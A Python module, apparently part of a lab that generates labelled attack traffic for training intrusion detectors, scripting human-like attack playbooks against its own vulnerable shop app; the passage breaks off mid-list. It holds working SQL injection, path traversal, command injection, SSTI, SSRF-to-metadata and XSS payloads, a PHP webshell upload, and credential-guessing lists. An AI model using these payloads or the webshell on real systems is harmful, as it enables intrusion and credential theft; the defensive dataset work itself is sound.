"""Hand-written attacks, planned as steps.

These are the attacks a person carries out, as opposed to the tool runs in
`tools.py`. They exist because tool output is recognisable: sqlmap has a
signature, nikto has a signature, and a dataset made only of tool traffic
teaches a detector to spot tools rather than to spot attacks.

Three things make these look human rather than generated:

**They include mistakes.** The first traversal attempt uses too few `../` and
404s; the operator counts again and gets it. The first UNION guesses the wrong
column count. Real attack traffic is mostly failure, and a log where every
payload lands first time is a log where the failed attempts -- the majority of
what a real analyst sees -- are simply absent.

**They include dead ends.** Endpoints that turn out to be hardened get probed
and abandoned. That traffic is labelled by what it was, not by whether it
worked.

**They are paced.** Each step carries how long the operator thought before
making it. The runner honours that, so the inter-arrival pattern of an attack
is nothing like the driver's and nothing like a tool's.

Every payload here targets the lab's own application, which publishes no host
port and is reachable only from the three lab networks. The weaknesses they
exercise are documented in `app/VULNERABILITIES.md`.

Stdlib only.
"""

from typing import NamedTuple

from shared.clients.personas import SITE


class AttackStep(NamedTuple):
    method: str
    path: str
    category: str
    #: Contiguous runs of one activity become one episode. A playbook moves
    #: through its activities and never returns to one it has left.
    activity: str
    #: Seconds the operator spent before making this request. Reading a
    #: response takes longer than pasting the next payload.
    think: float = 1.0
    body: str = None
    headers: tuple = ()
    #: What the operator was trying. Recorded in the ledger for the dataset's
    #: own documentation, never used to derive a label.
    note: str = ""


class Outcome(NamedTuple):
    """What the operator saw when its last request came back.

    This is the only thing a playbook may branch on. It describes the response
    to that operator's *own* request and nothing else: several campaigns run at
    once against one shared application, so a branch taken on anything another
    campaign could have changed would stop the build reproducing.

    `body` is a bounded prefix, not the whole response. Every success marker in
    `app/VULNERABILITIES.md` appears early -- an injected username, `root:`,
    `uid=`, `Fetched` -- and holding whole pages for a campaign's worth of
    requests buys nothing.
    """

    status: int = None
    body: str = ""
    #: Seconds the request took. The only signal a time-based injection has:
    #: SQLite has no SLEEP(), so the payload is a query heavy enough to be
    #: measured, and ~1.0s against ~0.03s is the whole difference.
    elapsed: float = 0.0


#: Comment markers an operator might reach for. `#` is MySQL's; against
#: SQLite the statement raises and the search page says so. An operator who
#: assumed the wrong backend finds that out by trying, which is a class of
#: failed attempt these playbooks did not previously contain at all.
SQL_COMMENTS = ("--", "#", "--+", "/**/")

#: What they break the string with.
SQL_QUOTES = ("'", '"')

#: How somebody writes a directory climb. `....//` and `..././` are filter
#: bypasses -- they defeat a naive strip of `../`, and against an endpoint
#: that does no normalisation at all they simply do not climb.
TRAVERSALS = ("../", "....//", "..././")

#: Ways of appending a second command. `||` only runs the second if the first
#: *failed*, and `ping 127.0.0.1` succeeds, so an operator who reaches for it
#: gets nothing back and has to think again.
SHELL_SEPARATORS = (";", "|", "&&", "||")


class Style(NamedTuple):
    """One operator's habits: the syntax they reach for, in the order they do.

    Fixed for a whole campaign. Two people testing the same injection point
    genuinely differ -- one types `--`, another `#` -- but neither changes
    their mind halfway through their own run, and an operator whose comment
    marker shifted between phases would be as impossible as one whose user
    agent did.

    Ordered rather than single: the first entry is the habit, and the rest are
    what they fall back to when the response says it did not parse. That is
    what makes a wrong guess a guess rather than noise.
    """

    sql_comments: tuple = SQL_COMMENTS
    sql_quotes: tuple = SQL_QUOTES
    traversals: tuple = TRAVERSALS
    shell_separators: tuple = SHELL_SEPARATORS


def operator_style(rng):
    """The habits one operator brings, drawn once and kept for the run."""
    def preference(options):
        order = list(options)
        rng.shuffle(order)
        return tuple(order)

    return Style(preference(SQL_COMMENTS), preference(SQL_QUOTES),
                 preference(TRAVERSALS), preference(SHELL_SEPARATORS))


def _q(value):
    from urllib.parse import quote
    return quote(value, safe="")


# ---------------------------------------------------------------------------
# Reconnaissance
# ---------------------------------------------------------------------------

#: What somebody checks for before touching anything. Wider than any one
#: operator looks at: this phase opens most of the campaigns, and while it was
#: a fixed list of seven it was the largest single block of byte-identical
#: traffic in the dataset -- four operators fetching the same seven paths in
#: the same order in every build.
RECON_PATHS = (
    "/robots.txt", "/sitemap.xml", "/humans.txt", "/favicon.ico",
    "/.well-known/security.txt", "/crossdomain.xml",
    "/.git/config", "/.git/HEAD", "/.gitignore", "/.svn/entries",
    "/.env", "/.env.local", "/.env.backup",
    "/server-status", "/server-info", "/.htaccess", "/web.config",
    "/README.md", "/CHANGELOG.md", "/LICENSE",
    "/composer.json", "/composer.lock", "/package.json", "/yarn.lock",
    "/.DS_Store", "/Dockerfile", "/docker-compose.yml",
)

def recon(rng, style, known):
    """Find out what this is before touching anything.

    The front page and a HEAD for the banner are what everybody does. What
    comes after is whatever this operator's notes say to look for, and no two
    sets of notes are the same -- which matters more than it sounds, because
    this phase opens most of the campaigns and a fixed list here was the
    single largest block of byte-identical traffic in the whole dataset.
    """
    root = yield AttackStep("GET", "/", "reconnaissance", "recon", 2.0,
                            note="look at the site like a customer would")
    yield AttackStep("HEAD", "/", "reconnaissance", "recon", 2.5,
                     note="server banner and headers")
    for path in rng.sample(RECON_PATHS, rng.randint(4, 8)):
        yield AttackStep("GET", path, "reconnaissance", "recon",
                         rng.uniform(2.0, 4.0), note="what is lying around")
    return frozenset({"mapped"}) if _answered(root) else frozenset()


#: What a hand-walked wordlist is drawn from. Wider than any one operator
#: walks, and walked in the order the draw gives it: two people working from
#: the same cheat sheet do not pick the same entries or try them in the same
#: sequence, and a dataset where they do teaches the sequence.
ENUMERATION_WORDLIST = (
    "/admin/", "/administrator/", "/admin.php", "/admin/login.php",
    "/backup/", "/backup.zip", "/backup.tar.gz", "/backups/",
    "/old/", "/old.zip", "/new/", "/tmp/", "/temp/",
    "/test.php", "/test/", "/dev/", "/staging/",
    "/phpinfo.php", "/info.php", "/i.php",
    "/wp-login.php", "/wp-admin/", "/wordpress/", "/wp-content/",
    "/config.bak", "/config.php.bak", "/configuration.php", "/settings.php",
    "/db.sql", "/dump.sql", "/database.sql", "/db_backup.sql",
    "/uploads/", "/files/", "/media/", "/static/",
    "/cgi-bin/", "/scripts/", "/bin/",
    "/.svn/entries", "/.hg/store", "/.DS_Store",
    "/server-info", "/status", "/health", "/metrics",
    "/phpmyadmin/", "/adminer.php", "/console", "/debug",
)


def directory_enumeration(rng, style, known):
    """Walk part of a wordlist by hand. Nearly all of it 404s."""
    walked = rng.sample(ENUMERATION_WORDLIST, rng.randint(10, 16))
    found = False
    for path in walked:
        outcome = yield AttackStep("GET", path, "enumeration", "enumerate",
                                   0.8, note="hand-walked wordlist")
        found = found or _answered(outcome)
    return frozenset({"found_path"}) if found else frozenset()


# ---------------------------------------------------------------------------
# SQL injection -- the /search endpoint (weakness 1)
# ---------------------------------------------------------------------------

#: What `app/search.php` renders when the statement raised. The endpoint
#: swallows the error and answers 200 either way, so this notice is the only
#: thing separating a UNION with the wrong column count from one that fits.
SEARCH_REFUSED = "That search could not be run."


#: The result count `app/search.php` renders above the grid. Present on any
#: search page that rendered at all, including one that found nothing.
SEARCH_RENDERED = "result(s)"


#: Prefix for the fact recording which comment marker actually parsed, so a
#: later phase can use it instead of guessing again.
SQL_COMMENT = "sql_comment="


def _settled_comment(known, style):
    """The marker an earlier phase found working, or this operator's habit."""
    for fact in known:
        if fact.startswith(SQL_COMMENT):
            return fact[len(SQL_COMMENT):]
    return style.sql_comments[0]


def _fitted(outcome):
    """Did that UNION land?

    Positive evidence, not merely the absence of the refusal: a page that came
    back empty, or not at all, tells the operator nothing and must leave it
    guessing. Testing only for the refusal would read silence as success --
    which is how a run with a broken connection would report a whole campaign
    of exploitation it never performed.
    """
    if outcome is None or outcome.status != 200:
        return False
    return (SEARCH_RENDERED in outcome.body
            and SEARCH_REFUSED not in outcome.body)


#: How much slower a heavy query has to be than its own control before the
#: operator believes the delay is real. The app test measures ~1.0s against
#: ~0.03s; this leaves room for a loaded build host without believing noise.
BLIND_DELAY = 0.4


def _answered(outcome):
    """Did the request get a real answer rather than a refusal or a miss?"""
    return outcome is not None and outcome.status == 200


def _shows(outcome, marker):
    """Did the answer carry the thing the operator was looking for?

    Silence is not success. A request that never completed, or came back
    empty, leaves the operator knowing nothing -- and a playbook that read it
    as a win would report exploitation the run never performed.
    """
    return _answered(outcome) and marker in outcome.body


def _signed_in(outcome):
    """`/login` redirects on success, 401 on a bad password, 429 once locked."""
    return outcome is not None and outcome.status == 302


def _locked_out(outcome):
    return outcome is not None and outcome.status == 429


def sqli_probing(rng, style, known):
    """Find the injection point, guess wrong, then right.

    Two things are being guessed at once and the operator knows neither: how
    many columns the table has, and what the backend is. `#` comments in
    MySQL and raises in SQLite; a trailing `/**/` comments nothing and leaves
    the rest of the statement to fail. So a run that gets no page at all from
    any column count has learned something about the *syntax*, not the shape,
    and reaches for a different marker.

    It stops the moment one comes back rendered. Carrying on through the rest
    after that is the tell of a script rather than a person.
    """
    quote = style.sql_quotes[0]
    for step in [
        AttackStep("GET", "/search?q=oak", "browsing", "probe", 3.0,
                   note="baseline: what does a normal search look like"),
        AttackStep("GET", f"/search?q={_q(quote)}", "injection", "probe", 4.0,
                   note="one quote -- does it break"),
        AttackStep("GET", f"/search?q={_q(quote * 2)}", "injection",
                   "probe", 3.0, note="two -- does it recover"),
        AttackStep("GET",
                   f"/search?q={_q('zzqq' + quote + ' OR 1=1' + style.sql_comments[0])}",
                   "injection", "probe", 6.0, note="boolean true"),
        AttackStep("GET",
                   f"/search?q={_q('zzqq' + quote + ' OR 1=2' + style.sql_comments[0])}",
                   "injection", "probe", 4.0,
                   note="boolean false -- compare the two"),
    ]:
        yield step

    # Three of the four, which guarantees at least one that parses here:
    # only `#` and a trailing `/**/` fail against SQLite.
    for marker in style.sql_comments[:3]:
        for columns in (3, 5, 8):
            payload = (quote + " UNION SELECT "
                       + ",".join(str(n) for n in range(1, columns + 1))
                       + marker)
            landed = _fitted((yield AttackStep(
                "GET", f"/search?q={_q(payload)}", "injection", "probe", 5.0,
                note=f"{columns} columns, {marker}")))
            if landed:
                return frozenset({"sqli_confirmed", SQL_COMMENT + marker})
    return frozenset()


def sqli_extraction(rng, style, known):
    """Having found the shape, take the account table.

    Written with the marker the probing settled on rather than this operator's
    first preference: they watched one fail a moment ago and would not reach
    for it again.
    """
    quote, marker = style.sql_quotes[0], _settled_comment(known, style)
    took = False
    for columns, note, category in (
            ("1,2,3,name,5,6,7,8 FROM sqlite_master",
             "what tables are there", "injection"),
            ("1,2,3,username,5,6,7,8 FROM users", "usernames", "injection"),
            ("1,2,3,username,password_hash,6,7,8 FROM users",
             "usernames and password hashes -- this is the payoff",
             "exploitation")):
        payload = quote + " UNION SELECT " + columns + marker
        took = _fitted((yield AttackStep(
            "GET", "/search?q=" + _q(payload), category, "extract", 6.0,
            note=note))) or took
    return frozenset({"data"}) if took else frozenset()


def sqli_time_based(rng, style, known):
    """The blind path, for when nothing is reflected.

    SQLite has no SLEEP(); hexing a large blob is the substitution. Measured
    at ~1.0s against ~0.03s. Used sparingly -- it materialises a 400MB string.

    Judged against its own control rather than a fixed threshold: a loaded
    build host is slow for both queries, and the difference is the evidence.
    """
    quote, marker = style.sql_quotes[0], _settled_comment(known, style)
    heavy = yield AttackStep("GET", "/search?q=" + _q(
        quote + " AND 1=(SELECT LENGTH(HEX(RANDOMBLOB(200000000))))" + marker),
        "injection", "blind", 8.0, note="does a heavy query delay it")
    control = yield AttackStep("GET", "/search?q=" + _q(
        quote + " AND 1=1" + marker), "injection", "blind", 4.0,
        note="control: same shape, no work")
    if heavy is None or control is None:
        return frozenset()
    if heavy.elapsed - control.elapsed > BLIND_DELAY:
        return frozenset({"sqli_confirmed", SQL_COMMENT + marker})
    return frozenset()


# ---------------------------------------------------------------------------
# Path traversal (weakness 3)
# ---------------------------------------------------------------------------

def path_traversal(rng, style, known):
    """Count the levels wrong, then overshoot on purpose.

    Two guesses again: how deep the document directory sits, and how to write
    the climb. `....//` and `..././` defeat a filter that strips `../` once --
    and this endpoint does no normalisation at all, so against it they are
    simply wrong and read nothing.

    The counting stops the moment a file comes back, and only then is the rest
    of the run worth sending.
    """
    yield AttackStep("GET", "/download?file=returns-policy.txt",
                     "browsing", "traverse", 3.0,
                     note="baseline: what does a legitimate document look like")

    climbed = None
    for climb in style.traversals:
        for depth in (2, 4, 8):
            read = _shows((yield AttackStep(
                "GET", "/download?file=" + _q(climb * depth + "etc/passwd"),
                "path_traversal", "traverse", 3.5,
                note=f"{depth} levels of {climb}")), "root:")
            if read:
                climbed = climb * depth
                break
        if climbed:
            break
    if climbed is None:
        return frozenset()

    for target, note in (("etc/hostname", "what host is this"),
                         ("etc/hosts", "what else does it know about")):
        yield AttackStep("GET", "/download?file=" + _q(climbed + target),
                         "path_traversal", "traverse", 2.5, note=note)
    return frozenset({"file_read"})


# ---------------------------------------------------------------------------
# Access control (weakness 2, plus the hardened routes)
# ---------------------------------------------------------------------------

def idor_walk(rng, style, known, start=1, count=10):
    """Sign in, then walk the order ids.

    The ids are globally sequential and interleaved across customers, so most
    of what this returns belongs to somebody else. In the log it is a run of
    consecutive 200s from one client -- and no single line of it looks wrong.

    None of it happens if the sign-in did not take: the lookup needs a session,
    and walking ids as an anonymous visitor only collects redirects.
    """
    yield AttackStep("GET", "/login", "authentication", "signin", 3.0,
                     note="sign in with the account we have")
    signed_in = _signed_in((yield AttackStep(
        "POST", "/login", "authentication", "signin", 2.0,
        body="username=demo&password=demo123")))
    if not signed_in:
        return frozenset()

    yield AttackStep("GET", "/account/orders", "browsing", "signin", 3.0,
                     note="our own orders, to learn the id format")

    walked = False
    for n in range(start, start + count):
        outcome = yield AttackStep(
            "GET", f"/account/orders/{n}", "access_control", "walk", 0.9,
            note="walking the sequence")
        walked = walked or _shows(outcome, "Order #")
    facts = {"session"}
    if walked:
        facts.add("idor_confirmed")
    return frozenset(facts)


def forced_browsing(rng, style, known):
    """Try the admin area anonymously, then with the account we hold.

    This is the phase that earns the rest. `/admin/users` and `/admin/orders`
    enforce the role check and answer 403; `/admin/ping` and `/admin/template`
    carry no check at all. Which is which is not something an operator knows in
    advance, and it is what makes attacking them afterwards a decision rather
    than a checklist.

    An anonymous pass cannot tell those two groups apart. `require_login()`
    answers before `require_admin()` ever runs, so everything with a session
    check of any kind comes back as the same redirect, and only the routes with
    no check at all answer at all. What the redirect does say is that the path
    exists and wants a session -- unlike a 404, which says there is nothing
    there. So the operator signs in with the customer account it holds and asks
    the same questions again, and the second pass is where the role check
    finally answers: 403 on the two hardened routes, and 200 on a landing page
    an ordinary customer was never meant to see.

    That second pass is new. Without it this docstring described a 403 that
    appeared nowhere in the 1.25 million lines across the three tiers this
    repository had shipped, because every forced-browsing request in all of
    them was anonymous and `require_login()` bounced it first.
    """
    reachable = False
    bounced = False
    for step in [
        AttackStep("GET", "/admin/", "access_control", "forced", 3.0,
                   note="is there an admin area at all"),
        AttackStep("GET", "/admin/users", "access_control", "forced", 2.5,
                   note="does the role check hold here"),
        AttackStep("GET", "/admin/orders", "access_control", "forced", 2.0,
                   note="and here"),
        AttackStep("GET", "/admin/ping?host=127.0.0.1", "access_control",
                   "forced", 3.0, note="what about this one"),
        AttackStep("GET", "/admin/template?tpl=Hello", "access_control",
                   "forced", 2.5, note="and this one"),
    ]:
        outcome = yield step
        reachable = reachable or _answered(outcome)
        bounced = bounced or (outcome is not None and outcome.status == 302)

    # Nothing asked for a session, so there is nothing a sign-in would reveal.
    if not bounced:
        return frozenset({"admin_reachable"}) if reachable else frozenset()

    yield AttackStep("GET", "/login", "authentication", "signin", 2.5,
                     note="the redirect says this wants a session")
    if not _signed_in((yield AttackStep(
            "POST", "/login", "authentication", "signin", 2.0,
            body="username=demo&password=demo123"))):
        return frozenset({"admin_reachable"}) if reachable else frozenset()

    for step in [
        AttackStep("GET", "/admin/", "access_control", "forced", 2.5,
                   note="signed in as a customer this time"),
        AttackStep("GET", "/admin/users", "access_control", "forced", 2.0,
                   note="does the role check hold for a signed-in customer"),
        AttackStep("GET", "/admin/orders", "access_control", "forced", 2.0,
                   note="and here"),
    ]:
        outcome = yield step
        reachable = reachable or _answered(outcome)
    # It signed in, so it holds a session the next play does not have to work
    # out for itself. `ssrf` reads this: the importer is session-gated, and one
    # operator signing in twice in one campaign is not a shape a reader of the
    # log could account for.
    facts = {"session"}
    if reachable:
        facts.add("admin_reachable")
    return frozenset(facts)


def verb_tampering(rng, style, known):
    """Same URLs, different methods, in case the check is method-scoped."""
    for step in [
        AttackStep("POST", "/admin/users", "access_control", "verbs", 2.5,
                   note="does POST bypass the check"),
        AttackStep("HEAD", "/admin/users", "access_control", "verbs", 2.0,
                   note="does HEAD"),
        AttackStep("OPTIONS", "/admin/orders", "access_control", "verbs", 2.0,
                   note="what methods does it admit to"),
        AttackStep("DELETE", "/api/cart?id=1", "access_control", "verbs", 2.0,
                   note="unauthenticated delete"),
    ]:
        yield step


# ---------------------------------------------------------------------------
# Command injection and SSTI (weaknesses 6 and 7)
# ---------------------------------------------------------------------------

def command_injection(rng, style, known):
    """Append a second command to the host check, if it will take one.

    Which character does the appending is a guess. `||` runs the second
    command only when the first *failed*, and `ping 127.0.0.1` succeeds, so an
    operator who reaches for it gets an ordinary ping back and learns nothing
    -- from the log, a request indistinguishable from the ones that work.

    Once something does come back, the rest of the run uses that character.
    Escalating with one the operator watched do nothing is not a mistake a
    person makes twice in a row.
    """
    yield AttackStep("GET", "/admin/ping?host=127.0.0.1", "reconnaissance",
                     "cmdi", 3.0, note="baseline")

    appends = None
    # All of them, not a slice: somebody who believes there is command
    # injection here grinds through what they know before giving up, and
    # a slice made whether they ever tried `;` depend on the shuffle.
    for separator in style.shell_separators:
        probe = yield AttackStep(
            "GET", "/admin/ping?host=" + _q(f"127.0.0.1{separator}id"),
            "injection", "cmdi", 5.0, note=f"append with {separator}")
        if _shows(probe, "uid="):
            appends = separator
            break
    if appends is None:
        return frozenset()

    for command, category, note in (
            ("whoami", "injection", "who are we"),
            ("uname -a", "injection", "what is this box"),
            ("cat /etc/passwd", "exploitation", "read a file through it")):
        yield AttackStep(
            "GET", "/admin/ping?host=" + _q(f"127.0.0.1{appends}{command}"),
            category, "cmdi", 3.5, note=note)
    return frozenset({"rce"})


def ssti(rng, style, known):
    """Find out whether the braces are substituted or evaluated.

    The probe multiplies two numbers nothing else on the page would produce.
    `{{7*7}}` is what everyone reaches for first and the wrong choice here: a
    shop page is full of prices and ids, and `49` appearing somewhere in the
    markup would have the operator believe an evaluation that never happened.
    """
    yield AttackStep("GET", "/admin/template?tpl=" + _q("{{name}}"),
                     "reconnaissance", "ssti", 3.0, note="baseline substitution")
    probe = yield AttackStep("GET", "/admin/template?tpl=" + _q("{{31337*2}}"),
                             "injection", "ssti", 5.0,
                             note="does it evaluate or substitute")
    if not _shows(probe, "62674"):
        return frozenset()

    for step in [
        AttackStep("GET", "/admin/template?tpl=" + _q("{{phpversion()}}"),
                   "injection", "ssti", 4.0, note="it evaluates"),
        AttackStep("GET", "/admin/template?tpl=" + _q(
            "{{file_get_contents('/etc/passwd')}}"),
            "exploitation", "ssti", 6.0, note="arbitrary PHP"),
    ]:
        yield step
    return frozenset({"rce"})


# ---------------------------------------------------------------------------
# SSRF (weakness 4)
# ---------------------------------------------------------------------------

def ssrf(rng, style, known):
    """Point the importer at things it should not reach.

    Nothing outside the lab is routable from the container, so the external
    and metadata attempts fail at the network layer. The attempt is the part
    that lands in the dataset, and recognising it is the skill -- so those are
    sent whether or not the baseline proved the importer fetches anything.

    The importer is behind `require_login()` and nothing else. That is exactly
    weakness 4 -- no role check, but a session all the same -- so an anonymous
    run is redirected away from every step and carries no evidence of SSRF at
    all. The operator signs in with the customer account it holds, unless an
    earlier play in the campaign already did.

    The baseline names this site the way its own pages do. Naming it by the
    address the container answers on put a literal IP in a parameter, which is
    the one marker separating the payloads below from an ordinary import.
    """
    if "session" not in known:
        yield AttackStep("GET", "/login", "authentication", "signin", 2.5,
                         note="the importer wants a session, not a role")
        if not _signed_in((yield AttackStep(
                "POST", "/login", "authentication", "signin", 2.0,
                body="username=demo&password=demo123"))):
            return frozenset()

    baseline = yield AttackStep("GET", "/admin/import-image?url=" + _q(
        f"{SITE}/assets/css/site.css"), "ssrf", "ssrf", 4.0,
        note="baseline: a URL it is supposed to fetch")
    fetches = _shows(baseline, "Fetched")

    for step in [
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://169.254.169.254/latest/meta-data/"), "ssrf", "ssrf", 5.0,
            note="AWS instance metadata"),
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://metadata.google.internal/computeMetadata/v1/"),
            "ssrf", "ssrf", 3.5, note="GCP metadata"),
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://127.0.0.1/admin/users"), "ssrf", "ssrf", 4.0,
            note="make the server fetch its own admin page"),
        AttackStep("GET", "/admin/import-image?url=" + _q("file:///etc/passwd"),
                   "ssrf", "ssrf", 4.0, note="scheme confusion"),
    ]:
        yield step
    facts = {"session"}
    if fetches:
        facts.add("ssrf_confirmed")
    return frozenset(facts)


# ---------------------------------------------------------------------------
# Upload bypass ending in a webshell (weakness 5)
# ---------------------------------------------------------------------------

WEBSHELL_BODY = '<?php echo "OK:".shell_exec($_GET["c"]); ?>'


def upload_webshell(rng, style, known):
    """The obvious attempt fails; the double extension gets through.

    Three things have to hold in order -- the sign-in, then the upload, then
    the file executing -- and each is checked before the next is attempted. A
    run that asks for `/uploads/shell.php.jpg` after a 415 is asking for a file
    it watched the server refuse.
    """
    yield AttackStep("GET", "/login", "authentication", "signin", 2.5)
    if not _signed_in((yield AttackStep(
            "POST", "/login", "authentication", "signin", 2.0,
            body="username=demo&password=demo123"))):
        return frozenset()

    yield AttackStep("GET", "/account/avatar", "browsing", "upload", 3.0,
                     note="find the upload form")
    yield AttackStep("POST", "/account/avatar", "exploitation", "upload", 5.0,
                     body="@upload:shell.php",
                     note="plain .php -- the extension check catches this")
    accepted = _answered((yield AttackStep(
        "POST", "/account/avatar", "exploitation", "upload", 6.0,
        body="@upload:shell.php.jpg", note="double extension")))
    if not accepted:
        return frozenset({"session"})

    facts = {"session", "upload_accepted"}
    if not _shows((yield AttackStep(
            "GET", "/uploads/shell.php.jpg?c=id", "exploitation", "webshell",
            4.0, note="is it executable")), "OK:"):
        return frozenset(facts)

    for step in [
        AttackStep("GET", "/uploads/shell.php.jpg?c=" + _q("uname -a"),
                   "exploitation", "webshell", 3.0),
        AttackStep("GET", "/uploads/shell.php.jpg?c=" + _q(
            "ls -la /var/www/html"), "exploitation", "webshell", 4.0,
            note="look around"),
        AttackStep("GET", "/uploads/shell.php.jpg?c=" + _q("cat /etc/passwd"),
                   "exploitation", "webshell", 3.5),
    ]:
        yield step
    return frozenset(facts | {"shell"})


# ---------------------------------------------------------------------------
# Credentials (against the hardened login)
# ---------------------------------------------------------------------------

#: Guesses to draw from. Longer than any one run uses, so two operators
#: working the same account do not send the same twelve in the same order.
PASSWORD_LIST = (
    "123456", "password", "admin", "letmein", "qwerty", "demo", "demo1",
    "welcome", "monkey", "dragon", "hunter2", "demo123", "111111", "abc123",
    "iloveyou", "sunshine", "princess", "football", "charlie", "aa123456",
    "password1", "qwerty123", "1q2w3e4r", "admin123", "trustno1", "shopadmin",
    "fettle", "brassneck", "changeme", "letmein1", "passw0rd", "secret",
)


#: The account the operators who need a session sign in with. They have working
#: credentials for it, so nothing needs to guess at it.
OPERATOR_ACCOUNT = "demo"

#: Who a credential attack goes after. Deliberately never OPERATOR_ACCOUNT.
#:
#: Partly because it is what a real attacker does -- these are the usernames a
#: harvested list or an extraction hands you, and someone who already has
#: working credentials does not brute-force them. And partly for a reason a
#: build measured: `/login` locks an account after five failures, so while
#: `credential_hunter` was working `demo`, `webshell_operator` signing in
#: three seconds later got a 429 and its whole campaign stopped. That is a
#: real interaction between two attackers on one target, and a fair thing for
#: a log to contain -- but it makes one campaign's run depend on another
#: campaign's timing, and two builds of one seed then stop agreeing.
CREDENTIAL_TARGETS = ("agatha", "rmarsh", "pcollis")

#: Who a spray goes after. Wider than the accounts anyone here has heard of,
#: because a spray is aimed at a *population* -- the names are guesses at what
#: a shop's staff accounts are called. Never OPERATOR_ACCOUNT.
SPRAY_ACCOUNTS = (
    "agatha", "rmarsh", "pcollis", "admin", "administrator", "info",
    "support", "sales", "webmaster", "office", "accounts", "orders",
    "warehouse", "manager", "shop", "test", "guest", "service",
)

#: What it sprays. One or two, and common enough that somebody somewhere has
#: chosen them -- which is the whole premise of the technique.
SPRAY_PASSWORDS = ("Winter2026!", "Password1", "Welcome1", "Fettle2026",
                   "Summer2026!")

#: A session the operator *worked out*, as opposed to one it was handed. Both
#: are a signed-in cookie and the log cannot tell them apart, but they are not
#: the same event: `idor_walk` signs in with a password it was given, and a
#: credential attack signs in with one it guessed. Reporting both as `session`
#: loses the only part that matters -- one of them is a break-in.
CREDENTIALS = "credentials"


def brute_force(rng, style, known, attempts=12):
    """Guess one account's password until the lockout says stop.

    `/login` answers 429 after five failures. Working through the rest of the
    wordlist against an account that is already locked is what a tool does; a
    person reads the 429 and gives up on that account.
    """
    target = rng.choice(CREDENTIAL_TARGETS)
    for password in rng.sample(PASSWORD_LIST, attempts):
        outcome = yield AttackStep(
            "POST", "/login", "credential_attack", "brute", 0.7,
            body=f"username={target}&password={password}",
            note="password guess")
        if _locked_out(outcome):
            return frozenset({"locked_out"})
        if _signed_in(outcome):
            return frozenset({CREDENTIALS})
    return frozenset()


def credential_stuffing(rng, style, known):
    """A list of pairs from somewhere else, tried once each.

    A 429 closes the account it names and says nothing about the others --
    every pair here is a different person. Abandoning the rest of somebody
    else's breach dump because one account happened to be locked is not a
    thing that happens; the operator notes it and carries on down the list.
    """
    # No pair here names OPERATOR_ACCOUNT: see CREDENTIAL_TARGETS. Locking it
    # out would stop an unrelated campaign that was signing in legitimately.
    pairs = (("admin", "admin"), ("root", "toor"), ("agatha", "agatha"),
             ("rmarsh", "rmarsh"), ("pcollis", "password1"),
             ("administrator", "letmein"), ("agatha", "brassneck"))
    closed, facts = set(), set()
    for username, password in pairs:
        if username in closed:
            # Already watched this one refuse. Sending to it again is the
            # tell of something working from a list rather than watching.
            continue
        outcome = yield AttackStep(
            "POST", "/login", "credential_attack", "stuff", 1.1,
            body=f"username={username}&password={password}",
            note="reused pair")
        if _locked_out(outcome):
            closed.add(username)
            facts.add("locked_out")
        elif _signed_in(outcome):
            # Everything it had already learnt, not just the way in: a run
            # that locked one account and walked into another did both.
            return frozenset(facts | {CREDENTIALS})
    return frozenset(facts)


def password_spray(rng, style, known):
    """One password, many accounts, staying under the lockout threshold.

    This is what a lockout teaches, and historically it is why attackers moved
    off brute force in the first place. Brute force trips the counter in five
    tries against one account; a spray never gives any account more than a
    couple, so the threshold is never reached and nothing comes back 429.

    Wide and shallow instead of deep and narrow. In a log it is a different
    shape entirely from the run that provoked it -- and it is the shape that
    is harder to see, because no single account looks attacked.
    """
    passwords = rng.sample(SPRAY_PASSWORDS, rng.randint(1, 2))
    accounts = rng.sample(SPRAY_ACCOUNTS, rng.randint(10, 16))
    for password in passwords:
        for username in accounts:
            outcome = yield AttackStep(
                "POST", "/login", "credential_attack", "spray",
                rng.uniform(6.0, 20.0),
                body=f"username={username}&password={password}",
                note="one password, many accounts")
            if _signed_in(outcome):
                return frozenset({CREDENTIALS})
    return frozenset()


# ---------------------------------------------------------------------------
# Cross-site scripting -- present, and barely visible in an access log
# ---------------------------------------------------------------------------

def xss(rng, style, known):
    """Reflected and stored.

    Kept deliberately, and documented as a labelling limitation: the reflected
    payload shows in %r and that is all, while retrieval of a stored payload is
    a request for an ordinary page and is indistinguishable from browsing.
    """
    reflected = False
    for payload, step in [
        ("<script>alert(1)</script>",
         AttackStep("GET", "/search?q=" + _q("<script>alert(1)</script>"),
                    "injection", "xss", 4.0, note="reflected, unencoded")),
        ('"><img src=x onerror=alert(1)>',
         AttackStep("GET", "/search?q=" + _q('"><img src=x onerror=alert(1)>'),
                    "injection", "xss", 3.0, note="attribute break-out")),
    ]:
        reflected = _shows((yield step), payload) or reflected

    for step in [
        AttackStep("GET", "/contact", "browsing", "xss", 3.0,
                   note="a form that stores what it is given"),
        AttackStep("POST", "/contact", "injection", "xss", 4.0,
                   body="name=x&email=x%40shop.test&message="
                        + _q("<script>fetch('/admin/users')</script>"),
                   note="stored -- and invisible in the log on retrieval"),
    ]:
        yield step
    return frozenset({"reflected"}) if reflected else frozenset()


def session_tampering(rng, style, known):
    for step in [
        AttackStep("GET", "/account/", "access_control", "session", 3.0,
                   headers=(("Cookie", "PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaa"),),
                   note="a session id we chose"),
        AttackStep("GET", "/account/orders", "access_control", "session", 2.5,
                   headers=(("Cookie", "PHPSESSID=0"),),
                   note="degenerate id"),
        AttackStep("GET", "/admin/", "access_control", "session", 3.0,
                   headers=(("Cookie", "PHPSESSID=admin; role=admin"),),
                   note="a cookie the application never sets"),
    ]:
        yield step


# ---------------------------------------------------------------------------
# The traffic that never recons
#
# Four of the six original campaigns opened with an identical `recon`, and the
# commonest attack traffic a public shop actually sees does no reconnaissance
# at all: it arrives with a list, tries the list, and leaves inside a minute.
# ---------------------------------------------------------------------------

#: Paths for an application that is not here. Bots sweeping for WordPress do
#: not check what the site runs first, which is why a shop with no PHP CMS on
#: it still collects thousands of these a week.
CMS_PATHS = (
    "/wp-login.php", "/wp-admin/", "/wp-admin/install.php",
    "/wp-content/plugins/wp-file-manager/readme.txt",
    "/wp-content/uploads/", "/wp-includes/wlwmanifest.xml",
    "/xmlrpc.php", "/wp-json/wp/v2/users", "/wordpress/wp-login.php",
    "/blog/wp-login.php", "/cms/wp-login.php", "/site/wp-login.php",
    "/administrator/index.php", "/joomla/administrator/",
    "/user/login", "/admin/config.php", "/typo3/index.php",
)

#: Paths from the tail of somebody's exploit list. The names are what makes
#: them recognisable; none of them exists here.
CVE_PATHS = (
